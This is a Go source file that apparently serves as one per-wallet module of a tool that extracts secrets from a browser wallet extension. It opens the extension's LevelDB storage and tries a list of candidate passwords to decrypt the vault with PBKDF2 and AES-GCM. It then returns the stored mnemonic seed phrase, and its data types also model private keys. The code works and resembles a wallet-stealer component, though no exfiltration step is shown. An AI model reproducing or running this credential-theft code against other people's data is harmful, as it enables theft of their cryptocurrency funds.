package binancesmartchain

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/syndtr/goleveldb/leveldb"
	"golang.org/x/crypto/pbkdf2"
)

type Binancesmartchain struct {
}

type Vault struct {
	Data string `json:"data"`
	IV   string `json:"iv"`
	Salt string `json:"salt"`
}

type Data struct {
	Version  string `json:"version"`
	Accounts []struct {
		Type         string `json:"type"`
		Name         string `json:"name"`
		ID           string `json:"id"`
		Mnemonic     string `json:"mnemonic"`
		IsDeprecated bool   `json:"isDeprecated"`
		IsHidden     bool   `json:"isHidden"`
		Addresses    []struct {
			Type       string `json:"type"`
			PrivateKey string `json:"privateKey"`
			Address    string `json:"address"`
		} `json:"addresses"`
	} `json:"accounts"`
}

func (Binancesmartchain) GetMnemonic(path string, passwords []string) (string, error) {
	db, err := leveldb.OpenFile(path, nil)
	if err != nil {
		return "", err
	}
	vaultBytes, err := db.Get([]byte("vault"), nil)
	if err != nil {
		return "", err
	}

	vaultBytes = bytes.ReplaceAll(vaultBytes, []byte(`\"`), []byte(`"`))
	vaultBytes = bytes.ReplaceAll(vaultBytes, []byte(`"{`), []byte(`{`))
	vaultBytes = bytes.ReplaceAll(vaultBytes, []byte(`}"`), []byte(`}`))

	var vault Vault
	if err = json.Unmarshal(vaultBytes, &vault); err != nil {
		return "", err
	}

	salt, err := base64.StdEncoding.DecodeString(vault.Salt)
	if err != nil {
		return "", err
	}

	iv, err := base64.StdEncoding.DecodeString(vault.IV)
	if err != nil {
		return "", err
	}

	encrypted, err := base64.StdEncoding.DecodeString(vault.Data)
	if err != nil {
		return "", err
	}

	for _, password := range passwords {
		key := pbkdf2.Key([]byte(password), salt, 10000, 32, sha256.New)
		block, err := aes.NewCipher(key)
		if err != nil {
			continue
		}
		gcm, err := cipher.NewGCMWithNonceSize(block, len(iv))
		if err != nil {
			continue
		}

		decrypted, err := gcm.Open(nil, iv, encrypted, nil)
		if err != nil {
			continue
		}

		var data Data
		if err = json.Unmarshal(decrypted, &data); err != nil {
			return "", err
		}

		for _, wallet := range data.Accounts {
			return wallet.Mnemonic, nil
		}
	}

	return "", fmt.Errorf("no valid password for %s", path)
}
